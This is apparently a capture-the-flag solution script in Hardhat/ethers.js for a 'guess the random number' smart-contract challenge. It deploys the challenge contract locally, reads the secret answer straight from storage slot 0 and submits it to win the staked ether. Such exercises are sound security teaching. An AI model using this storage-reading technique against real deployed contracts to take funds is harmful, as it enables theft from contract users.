import { ethers } from "hardhat";
var ONE_ETHER = ethers.utils.parseEther("1.0");

async function main() {
  const GuessTheRandomNumberChallenge = await ethers.getContractFactory(
    "GuessTheRandomNumberChallenge"
  );
  const guessTheRandomNumberChallenge =
    await GuessTheRandomNumberChallenge.deploy({
      value: ONE_ETHER,
    });
  await guessTheRandomNumberChallenge.deployed();

  var slot = 0;
  var answer = await ethers.provider.getStorageAt(
    guessTheRandomNumberChallenge.address,
    slot
  );
  await guessTheRandomNumberChallenge.guess(answer, {
    value: ONE_ETHER,
  });

  console.log(await guessTheRandomNumberChallenge.isComplete());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
